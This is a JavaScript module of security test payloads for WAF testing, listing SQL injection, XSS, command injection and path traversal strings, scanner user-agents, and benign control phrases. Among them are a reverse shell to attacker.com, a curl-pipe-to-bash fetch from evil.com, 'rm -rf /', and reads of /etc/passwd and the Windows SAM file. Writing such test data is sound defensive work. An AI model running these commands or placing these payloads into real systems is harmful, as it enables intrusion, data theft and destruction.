// Security test payloads for WAF tests

export const sqlInjectionPayloads = [
  "SELECT * FROM users WHERE id=1",
  "1' OR '1'='1",
  "1; DROP TABLE users--",
  "UNION SELECT username, password FROM users",
  "admin'--",
  "1' AND 1=1--",
  "'; EXEC xp_cmdshell('dir')--",
  "1' WAITFOR DELAY '0:0:10'--",
  "1' ORDER BY 1--",
  "BENCHMARK(10000000,SHA256('test'))",
];

export const xssPayloads = [
  "<script>alert('xss')</script>",
  "<img src=x onerror=alert('xss')>",
  "javascript:alert('xss')",
  "<svg onload=alert('xss')>",
  "<body onload=alert('xss')>",
  "<iframe src='javascript:alert(1)'>",
  "<div style='background:url(javascript:alert(1))'>",
  "'-alert(1)-'",
  "<script src='https://evil.com/xss.js'></script>",
];

export const commandInjectionPayloads = [
  "; cat /etc/passwd",
  "| ls -la",
  "`whoami`",
  "$(id)",
  "&& rm -rf /",
  "|| ping -c 10 evil.com",
  "; nc -e /bin/sh attacker.com 4444",
  "| curl https://evil.com/shell.sh | bash",
];

export const pathTraversalPayloads = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "....//....//....//etc/passwd",
  "/etc/passwd",
  "/proc/self/environ",
  "C:\\Windows\\System32\\",
];

export const maliciousBots = [
  "sqlmap/1.0",
  "Nikto/2.1.5",
  "nmap scripting engine",
  "masscan/1.0",
  "gobuster/3.1",
  "nuclei/2.0",
];

export const legitimatePayloads = [
  "I want to select the best option from the list",
  "The user dropped their phone",
  "Insert the key into the lock",
  "Update your profile settings",
  "Delete old files from downloads",
  "This is a script for a movie",
  "Click here for more information",
  "The image source is correct",
];
